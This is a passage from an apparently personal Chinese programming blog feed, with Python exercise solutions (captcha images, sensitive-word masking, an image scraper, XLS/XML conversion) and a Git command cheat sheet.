<h1 id="第-0010-题"><a href="#第-0010-题" class="headerlink" title="第 0010 题"></a>第 0010 题</h1><p>第 0010 题：使用 Python 生成类似于下图中的字母验证码图片</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw, ImageFont, ImageFilter</div><div class="line"><span class="keyword">import</span> random</div><div class="line"></div><div class="line"><span class="comment"># 随机字母:</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">rndChar</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> chr(random.randint(<span class="number">65</span>, <span class="number">90</span>))</div><div class="line"></div><div class="line"><span class="comment"># 随机颜色1:用于填充背景</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">rndColor</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> (random.randint(<span class="number">64</span>, <span class="number">255</span>), random.randint(<span class="number">64</span>, <span class="number">255</span>), random.randint(<span class="number">64</span>, <span class="number">255</span>))</div><div class="line"></div><div class="line"><span class="comment"># 随机颜色2:用于绘制字母</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">rndColor2</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> (random.randint(<span class="number">32</span>, <span class="number">127</span>), random.randint(<span class="number">32</span>, <span class="number">127</span>), random.randint(<span class="number">32</span>, <span class="number">127</span>))</div><div class="line"></div><div class="line"><span class="comment"># 240 x 60:</span></div><div class="line">width = <span class="number">60</span> * <span class="number">4</span></div><div class="line">height = <span class="number">60</span></div><div class="line">image = Image.new(<span class="string">'RGB'</span>, (width, height), (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>))</div><div class="line"><span class="comment"># 创建Font对象:</span></div><div class="line">font = ImageFont.truetype(<span class="string">'c:/Windows/Fonts/Arial.ttf'</span>, <span class="number">36</span>)</div><div class="line"><span class="comment"># 创建Draw对象:</span></div><div class="line">draw = ImageDraw.Draw(image)</div><div class="line"><span class="comment"># 填充每个像素:</span></div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(width):</div><div class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(height):</div><div class="line">        draw.point((x, y), fill=rndColor())</div><div class="line"><span class="comment"># 输出文字:</span></div><div class="line"><span class="keyword">for</span> t <span class="keyword">in</span> range(<span class="number">4</span>):</div><div class="line">    draw.text((<span class="number">60</span> * t + <span class="number">10</span>, <span class="number">10</span>), rndChar(), font=font, fill=rndColor2())</div><div class="line"><span class="comment"># 模糊:</span></div><div class="line">image = image.filter(ImageFilter.BLUR)</div><div class="line">image.save(<span class="string">'code.jpg'</span>, <span class="string">'jpeg'</span>)</div></pre></td></tr></table></figure>
<h1 id="第-0011-题"><a href="#第-0011-题" class="headerlink" title="第 0011 题"></a>第 0011 题</h1><p>第 0011 题： 敏感词文本文件 filtered_words.txt，里面的内容为以下内容，当用户输入敏感词语时，则打印出 Freedom，否则打印出 Human Rights。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">filename = <span class="string">'filtered_words.txt'</span></div><div class="line"></div><div class="line"><span class="keyword">with</span> open(filename, <span class="string">'r'</span>) <span class="keyword">as</span> f:</div><div class="line">    words = f.read().split()</div><div class="line"></div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">    s = input(<span class="string">'请输入单词&gt;&gt;&gt;'</span>)</div><div class="line">    </div><div class="line">    freedom = <span class="keyword">False</span></div><div class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> words:  </div><div class="line">        <span class="keyword">if</span> word <span class="keyword">in</span> s:</div><div class="line">            print(<span class="string">'Freedom'</span>)</div><div class="line">            freedom = <span class="keyword">True</span></div><div class="line">            <span class="keyword">break</span></div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> freedom:</div><div class="line">        print(<span class="string">'Human Rights'</span>)</div></pre></td></tr></table></figure>
<h1 id="第-0012-题"><a href="#第-0012-题" class="headerlink" title="第 0012 题"></a>第 0012 题</h1><p>第 0012 题： 敏感词文本文件 filtered_words.txt，里面的内容 和 0011题一样，当用户输入敏感词语，则用 星号 <em> 替换，例如当用户输入「北京是个好城市」，则变成「*</em>是个好城市」。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">filename = <span class="string">'filtered_words.txt'</span></div><div class="line"></div><div class="line"><span class="keyword">with</span> open(filename, <span class="string">'r'</span>) <span class="keyword">as</span> f:</div><div class="line">    words = f.read().split()</div><div class="line"></div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">    s = input(<span class="string">'请输入单词&gt;&gt;&gt;'</span>)</div><div class="line">    freedom = <span class="keyword">False</span></div><div class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> words:  </div><div class="line">        <span class="keyword">if</span> word <span class="keyword">in</span> s:</div><div class="line">            <span class="comment"># ** 替换原有字符串 </span></div><div class="line">            nPos = s.index(word)</div><div class="line">            nStr = <span class="string">''</span>.join([<span class="string">'*'</span> <span class="keyword">for</span> c <span class="keyword">in</span> word ])</div><div class="line">            s = s.replace(word, nStr)</div><div class="line">            freedom = <span class="keyword">True</span></div><div class="line">            print(s)</div><div class="line">            <span class="keyword">break</span></div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> freedom:</div><div class="line">        print(<span class="string">'Human Rights'</span>)</div></pre></td></tr></table></figure>
<h1 id="第-0013-题"><a href="#第-0013-题" class="headerlink" title="第 0013 题"></a>第 0013 题</h1><p>第 0013 题： 用 Python 写一个爬图片的程序，爬 这个链接里的日本妹子图片 :-)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup </div><div class="line"></div><div class="line">url = <span class="string">'http://tieba.baidu.com/p/2166231880'</span></div><div class="line">page = requests.get(url)</div><div class="line">soup = BeautifulSoup(page.text, <span class="string">'html.parser'</span>)</div><div class="line"></div><div class="line">n = <span class="number">0</span></div><div class="line"><span class="keyword">for</span> line <span class="keyword">in</span> soup.find_all(<span class="string">'img'</span>, attrs=&#123;<span class="string">'class'</span>:<span class="string">'BDE_Image'</span>&#125;):   </div><div class="line">    img_url = line.get(<span class="string">'src'</span>)</div><div class="line">    img_content = requests.get(img_url).content</div><div class="line">    filename = img_url[<span class="number">-10</span>:]</div><div class="line">    <span class="keyword">with</span> open(filename, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</div><div class="line">        f.write(img_content)</div><div class="line">    print(n, <span class="string">'image %s is download completed.'</span> % filename)</div><div class="line">    n += <span class="number">1</span></div></pre></td></tr></table></figure>
<h1 id="第-0014-题"><a href="#第-0014-题" class="headerlink" title="第 0014 题"></a>第 0014 题</h1><p>第 0014 题： 纯文本文件 student.txt为学生信息, 里面的内容（包括花括号）如下所示：</p>
<p>{<br>    “1”:[“张三”,150,120,100],<br>    “2”:[“李四”,90,99,95],<br>    “3”:[“王五”,60,66,68]<br>}<br>请将上述内容写到 student.xls 文件中：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> json</div><div class="line"><span class="keyword">import</span> xlwt</div><div class="line"></div><div class="line"><span class="comment"># jsonstr to python dict data</span></div><div class="line"><span class="keyword">with</span> open(<span class="string">'student.txt'</span>) <span class="keyword">as</span> f:  </div><div class="line">    dicts = json.loads(f.read())</div><div class="line"></div><div class="line"><span class="comment"># create xls</span></div><div class="line">xls = xlwt.Workbook()</div><div class="line">table = xls.add_sheet(<span class="string">'student'</span>)</div><div class="line"></div><div class="line"><span class="comment"># write xls</span></div><div class="line">row = <span class="number">0</span></div><div class="line">col = <span class="number">0</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> k <span class="keyword">in</span> sorted(dicts.keys()):</div><div class="line">    col = <span class="number">0</span></div><div class="line">    table.write(row, col, k)</div><div class="line">    col += <span class="number">1</span></div><div class="line">    <span class="keyword">for</span> v <span class="keyword">in</span> dicts[k]:</div><div class="line">        table.write(row, col, v)</div><div class="line">        col += <span class="number">1</span></div><div class="line">    row += <span class="number">1</span>    </div><div class="line"><span class="comment"># save to xls</span></div><div class="line">xls.save(<span class="string">'student.xls'</span>)</div></pre></td></tr></table></figure>
<h1 id="第-0015-题"><a href="#第-0015-题" class="headerlink" title="第 0015 题"></a>第 0015 题</h1><p>第 0015 题： 纯文本文件 city.txt为城市信息, 里面的内容（包括花括号）如下所示：</p>
<p>{<br>    “1” : “上海”,<br>    “2” : “北京”,<br>    “3” : “成都”<br>}<br>请将上述内容写到 city.xls 文件中</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> json</div><div class="line"><span class="keyword">import</span> xlwt</div><div class="line"></div><div class="line"><span class="comment"># jsonstr to python dict data</span></div><div class="line"><span class="keyword">with</span> open(<span class="string">'city.txt'</span>) <span class="keyword">as</span> f:  </div><div class="line">    dicts = json.loads(f.read())</div><div class="line"></div><div class="line"><span class="comment"># create xls</span></div><div class="line">xls = xlwt.Workbook()</div><div class="line">table = xls.add_sheet(<span class="string">'city'</span>)</div><div class="line"></div><div class="line"><span class="comment"># write xls</span></div><div class="line">row = <span class="number">0</span></div><div class="line">col = <span class="number">0</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> k <span class="keyword">in</span> sorted(dicts.keys()):</div><div class="line">    col = <span class="number">0</span></div><div class="line">    table.write(row, col, k)</div><div class="line">    table.write(row, col + <span class="number">1</span>, dicts[k])</div><div class="line">    row += <span class="number">1</span>    </div><div class="line"><span class="comment"># save to xls</span></div><div class="line">xls.save(<span class="string">'city.xls'</span>)</div></pre></td></tr></table></figure>
<h1 id="第-0016-题"><a href="#第-0016-题" class="headerlink" title="第 0016 题"></a>第 0016 题</h1><p>第 0016 题： 纯文本文件 numbers.txt, 里面的内容（包括方括号）如下所示：<br>[<br>    [1, 82, 65535],<br>    [20, 90, 13],<br>    [26, 809, 1024]<br>]<br>请将上述内容写到 numbers.xls 文件中</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> json</div><div class="line"><span class="keyword">import</span> xlwt</div><div class="line"></div><div class="line"><span class="comment"># jsonstr to python dict data</span></div><div class="line"><span class="keyword">with</span> open(<span class="string">'numbers.txt'</span>) <span class="keyword">as</span> f:  </div><div class="line">    lists = json.loads(f.read())</div><div class="line"></div><div class="line">print(lists)</div><div class="line"><span class="comment"># create xls</span></div><div class="line">xls = xlwt.Workbook()</div><div class="line">table = xls.add_sheet(<span class="string">'numbers'</span>)</div><div class="line"></div><div class="line"><span class="comment"># write xls</span></div><div class="line">row = <span class="number">0</span></div><div class="line">col = <span class="number">0</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> k <span class="keyword">in</span> lists:</div><div class="line">    col = <span class="number">0</span></div><div class="line">    <span class="keyword">for</span> v <span class="keyword">in</span> k:</div><div class="line">        table.write(row, col, v)</div><div class="line">        col += <span class="number">1</span></div><div class="line">    row += <span class="number">1</span>    </div><div class="line"><span class="comment"># save to xls</span></div><div class="line">xls.save(<span class="string">'numbers.xls'</span>)</div></pre></td></tr></table></figure>
<h1 id="第-0017-题"><a href="#第-0017-题" class="headerlink" title="第 0017 题"></a>第 0017 题</h1><p>第 0017 题：将 第 0014 题中的 student.xls 文件中的内容写到 student.xml 文件中，如下所示：</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;root&gt;
&lt;students&gt;
&lt;!-- 
    学生信息表
    &quot;id&quot; : [名字, 数学, 语文, 英文]
--&gt;
{
    &quot;1&quot; : [&quot;张三&quot;, 150, 120, 100],
    &quot;2&quot; : [&quot;李四&quot;, 90, 99, 95],
    &quot;3&quot; : [&quot;王五&quot;, 60, 66, 68]
}
&lt;/students&gt;
&lt;/root&gt;
</code></pre><p>代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> xml.etree.ElementTree <span class="keyword">as</span> ET</div><div class="line"><span class="keyword">import</span> xlrd</div><div class="line"></div><div class="line"><span class="comment"># read xls</span></div><div class="line">xls = xlrd.open_workbook(<span class="string">'student.xls'</span>)</div><div class="line">table = xls.sheet_by_name(<span class="string">'student'</span>)</div><div class="line"></div><div class="line">dicts = &#123;&#125;</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(table.nrows):</div><div class="line">    row = table.row_values(i)</div><div class="line">    dicts[row[<span class="number">0</span>]] = row[<span class="number">1</span>:]</div><div class="line"></div><div class="line"><span class="comment"># json.dumps无法解决dict的排序问题,所以手动拼接json string</span></div><div class="line">text = <span class="string">''</span></div><div class="line">text += <span class="string">'\n&#123;\n'</span></div><div class="line"><span class="keyword">for</span> k <span class="keyword">in</span> sorted(dicts.keys()):</div><div class="line">    lists = dicts[k]</div><div class="line">    s = <span class="string">"    \"%s\" : [\"%s\", %d, %d, %d],\n"</span> % (k, lists[<span class="number">0</span>], lists[<span class="number">1</span>], lists[<span class="number">2</span>], lists[<span class="number">3</span>])</div><div class="line">    text += s</div><div class="line">text += <span class="string">'&#125;\n'</span></div><div class="line">text = text[::<span class="number">-1</span>].replace(<span class="string">','</span>,<span class="string">''</span>,<span class="number">1</span>)[::<span class="number">-1</span>]  <span class="comment"># 翻转字符串，去掉第一个逗号，再翻转回来</span></div><div class="line"></div><div class="line"><span class="comment">#save to xml</span></div><div class="line">root = ET.Element(<span class="string">'root'</span>)</div><div class="line">students = ET.SubElement(root, <span class="string">'students'</span>)</div><div class="line">students.append(ET.Comment(<span class="string">u"""学生信息表  "id" : [名字, 数学, 语文, 英文]"""</span> ))</div><div class="line">students.text = text</div><div class="line">tree = ET.ElementTree(root)</div><div class="line">tree.write(<span class="string">'student.xml'</span>, encoding=<span class="string">'utf-8'</span>,  xml_declaration=<span class="keyword">True</span>)</div></pre></td></tr></table></figure>
<h1 id="第-0018-题"><a href="#第-0018-题" class="headerlink" title="第 0018 题"></a>第 0018 题</h1><p>第 0018 题： 将 第 0015 题中的 city.xls 文件中的内容写到 city.xml 文件中，如下所示：</p>
<pre><code>&lt;?xmlversion=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;root&gt;
&lt;citys&gt;
&lt;!--
    城市信息
--&gt;
{
    &quot;1&quot; : &quot;上海&quot;,
    &quot;2&quot; : &quot;北京&quot;,
    &quot;3&quot; : &quot;成都&quot;
}
&lt;/citys&gt;
&lt;/root&gt;
</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> xml.etree.ElementTree <span class="keyword">as</span> ET</div><div class="line"><span class="keyword">import</span> json</div><div class="line"><span class="keyword">import</span> xlrd</div><div class="line"></div><div class="line">xls = xlrd.open_workbook(<span class="string">'city.xls'</span>)</div><div class="line">table = xls.sheet_by_name(<span class="string">'city'</span>)</div><div class="line"></div><div class="line"><span class="comment"># get json string</span></div><div class="line">d = &#123;&#125;</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(table.nrows):</div><div class="line">    row = table.row_values(i)</div><div class="line">    d[row[<span class="number">0</span>]] = row[<span class="number">1</span>]</div><div class="line"></div><div class="line">json_str = json.dumps(d, ensure_ascii=<span class="keyword">False</span>)</div><div class="line"></div><div class="line"><span class="comment"># save to xml</span></div><div class="line">root = ET.Element(<span class="string">'root'</span>)</div><div class="line">citys = ET.SubElement(root, <span class="string">'citys'</span>)</div><div class="line">citys.append(ET.Comment(<span class="string">'城市信息'</span>))</div><div class="line">citys.text = json_str</div><div class="line">tree = ET.ElementTree(root)</div><div class="line">tree.write(<span class="string">'citys.xml'</span>, encoding = <span class="string">'utf-8'</span>, xml_declaration = <span class="keyword">True</span>)</div></pre></td></tr></table></figure>
<h1 id="第-0019-题"><a href="#第-0019-题" class="headerlink" title="第 0019 题"></a>第 0019 题</h1><p>第 0019 题： 将 第 0016 题中的 numbers.xls 文件中的内容写到 numbers.xml 文件中，如下所示：</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;root&gt;
&lt;numbers&gt;
&lt;!--
    数字信息
--&gt;

[
    [1, 82, 65535],
    [20, 90, 13],
    [26, 809, 1024]
]

&lt;/numbers&gt;
&lt;/root&gt;
</code></pre><p>代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> xml.etree.ElementTree <span class="keyword">as</span> ET</div><div class="line"><span class="keyword">import</span> json</div><div class="line"><span class="keyword">import</span> xlrd</div><div class="line"></div><div class="line">xls = xlrd.open_workbook(<span class="string">'numbers.xls'</span>)</div><div class="line">table = xls.sheet_by_name(<span class="string">'numbers'</span>)</div><div class="line"></div><div class="line"><span class="comment"># get json string</span></div><div class="line">l = []</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(table.nrows):</div><div class="line">    row = table.row_values(i)</div><div class="line">    l.append(row)</div><div class="line"></div><div class="line">json_str = json.dumps(l, ensure_ascii=<span class="keyword">False</span>)</div><div class="line">print(json_str)</div><div class="line"></div><div class="line"><span class="comment"># save to xml</span></div><div class="line">root = ET.Element(<span class="string">'root'</span>)</div><div class="line">citys = ET.SubElement(root, <span class="string">'numbers'</span>)</div><div class="line">citys.append(ET.Comment(<span class="string">'数字信息'</span>))</div><div class="line">citys.text = json_str</div><div class="line">tree = ET.ElementTree(root)</div><div class="line">tree.write(<span class="string">'numbers.xml'</span>, encoding = <span class="string">'utf-8'</span>, xml_declaration = <span class="keyword">True</span>)</div></pre></td></tr></table></figure>
<h1 id="第-0020-题"><a href="#第-0020-题" class="headerlink" title="第 0020 题"></a>第 0020 题</h1><p>第 0020 题： 登陆中国联通网上营业厅 后选择「自助服务」 –&gt; 「详单查询」，然后选择你要查询的时间段，点击「查询」按钮，查询结果页面的最下方，点击「导出」，就会生成类似于 2014年10月01日～2014年10月31日通话详单.xls 文件。写代码，对每月通话时间做个统计。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> xlrd</div><div class="line"></div><div class="line">xls = xlrd.open_workbook(<span class="string">'src.xls'</span>)</div><div class="line">table = xls.sheet_by_index(<span class="number">0</span>)</div><div class="line"></div><div class="line">total_time = <span class="number">0</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,table.nrows):</div><div class="line">    row = table.row_values(i)</div><div class="line">    total_time += int(row[<span class="number">3</span>])</div><div class="line"></div><div class="line">print(<span class="string">'total time : %d s'</span>  % total_time)</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;python 编程练习&lt;/p&gt;
&lt;p&gt;python 每日编程训练。（本文使用Python 3.5）&lt;/p&gt;
&lt;p&gt;来源于 - &lt;a href=&quot;https://github.com/Yixiaohan/show-me-the-code&quot;&gt;https://github.com/Yixiaohan/show-me-the-code&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Python基础" scheme="https://maoao530.github.io/categories/Python%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Python" scheme="https://maoao530.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Git笔记</title>
    <link href="https://maoao530.github.io/2016/07/01/git-note/"/>
    <id>https://maoao530.github.io/2016/07/01/git-note/</id>
    <published>2016-07-01T14:22:24.000Z</published>
    <updated>2016-12-10T14:06:49.536Z</updated>
    
    <content type="html"><![CDATA[<p>好记性不如烂笔头，把常用的GIT命令在这里记录一下。</p>
<a id="more"></a>
<h1 id="1-Git流程图"><a href="#1-Git流程图" class="headerlink" title="1 Git流程图"></a>1 Git流程图</h1><p><img src="/img/archives/git.png" alt="Git流程"></p>
<ul>
<li>workspace: 本地的工作目录。（记作A）</li>
<li>index：缓存区域，临时保存本地改动。（记作B）</li>
<li>local repository: 本地仓库，只想最后一次提交HEAD。（记作C）</li>
<li>remote repository：远程仓库。（记作D）</li>
</ul>
<h1 id="2-新建"><a href="#2-新建" class="headerlink" title="2 新建"></a>2 新建</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">git init                 //当前目录初始化为GIT代码库</div><div class="line">git init [project-name]  //新建一个目录，将其初始化为Git代码库</div><div class="line">git clone [url]          //检出</div><div class="line">git config --global user.email &quot;you@example.com&quot; //配置email</div><div class="line">git config --global user.name &quot;Name&quot; //配置用户名</div></pre></td></tr></table></figure>
<h1 id="3-操作"><a href="#3-操作" class="headerlink" title="3 操作"></a>3 操作</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">git add &lt;file&gt; // 文件添加，A → B</div><div class="line">git add . // 所有文件添加，A → B</div><div class="line">git commit -m &quot;代码提交信息&quot; //文件提交，B → C</div><div class="line">git commit --amend //与上次commit合并, *B → C</div><div class="line">git push origin master //推送至master分支, C → D</div><div class="line">git pull //更新本地仓库至最新改动， D → A</div><div class="line">git fetch //抓取远程仓库更新， D → C</div><div class="line">git log //查看提交记录</div><div class="line">git status //查看修改状态</div><div class="line">git diff//查看详细修改内容</div><div class="line">git show//显示某次提交的内容</div></pre></td></tr></table></figure>
<h1 id="4-撤销操作"><a href="#4-撤销操作" class="headerlink" title="4 撤销操作"></a>4 撤销操作</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">git reset &lt;file&gt;//某个文件索引会回滚到最后一次提交， C → B</div><div class="line">git reset//索引会回滚到最后一次提交， C → B</div><div class="line">git reset --hard // 索引会回滚到最后一次提交， C → B → A</div><div class="line">git checkout // 从index复制到workspace， B → A</div><div class="line">git checkout -- files // 文件从index复制到workspace， B → A</div><div class="line">git checkout HEAD -- files // 文件从local repository复制到workspace， C → A</div></pre></td></tr></table></figure>
<h1 id="5-分支相关"><a href="#5-分支相关" class="headerlink" title="5 分支相关"></a>5 分支相关</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">git checkout -b branch_name //创建名叫“branch_name”的分支，并切换过去</div><div class="line">git checkout master //切换回主分支</div><div class="line">git branch -d branch_name // 删除名叫“branch_name”的分支</div><div class="line">git push origin branch_name //推送分支到远端仓库</div><div class="line">git merge branch_name // 合并分支branch_name到当前分支(如master)</div><div class="line">git rebase //衍合，线性化的自动， D → A</div></pre></td></tr></table></figure>
<h1 id="6-冲突处理"><a href="#6-冲突处理" class="headerlink" title="6 冲突处理"></a>6 冲突处理</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">git diff //对比workspace与index</div><div class="line">git diff HEAD //对于workspace与最后一次commit</div><div class="line">git diff &lt;source_branch&gt; &lt;target_branch&gt; //对比差异</div><div class="line">git add &lt;filename&gt; //修改完冲突，需要add以标记合并成功</div></pre></td></tr></table></figure>
<h1 id="7-其他"><a href="#7-其他" class="headerlink" title="7 其他"></a>7 其他</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">git diff //对比workspace与index</div><div class="line">git diff HEAD //对于workspace与最后一次commit</div><div class="line">git diff &lt;source_branch&gt; &lt;target_branch&gt; //对比差异</div><div class="line">git add &lt;filename&gt; //修改完冲突，需要add以标记合并成功</div></pre></td></tr></table></figure>
<p>关于Git更详细可以参考：</p>
<p><a href="https://git-scm.com/book/zh/v2" target="_blank" rel="external">Git完整命令地址</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;好记性不如烂笔头，把常用的GIT命令在这里记录一下。&lt;/p&gt;
    
    </summary>
    
      <category term="其他" scheme="https://maoao530.github.io/categories/%E5%85%B6%E4%BB%96/"/>
    
    
      <category term="Git" scheme="https://maoao530.github.io/tags/Git/"/>
    
  </entry>
  
  <entry>
    <title>python中的@classmethod和@staticmethod</title>
    <link href="https://maoao530.github.io/2016/05/17/python-classmethod-staticmethod/"/>
    <id>https://maoao530.github.io/2016/05/17/python-classmethod-staticmethod/</id>
    <published>2016-05-17T15:58:59.000Z</published>
    <updated>2016-12-10T05:40:10.449Z</updated>
    
    <content type="html"><![CDATA[<p>花两分钟了解什么是实例方法，类方法，静态方法。</p>
<a id="more"></a>
<h1 id="1-定义"><a href="#1-定义" class="headerlink" title="1. 定义"></a>1. 定义</h1><p>python中类方法和静态方法是用装饰器<code>@classmethod</code>和<code>@staticmethod</code>来定义的。</p>
<p><a href="https://maoao530.github.io/2016/05/17/python-decorator/">点我学习什么是装饰器</a></p>
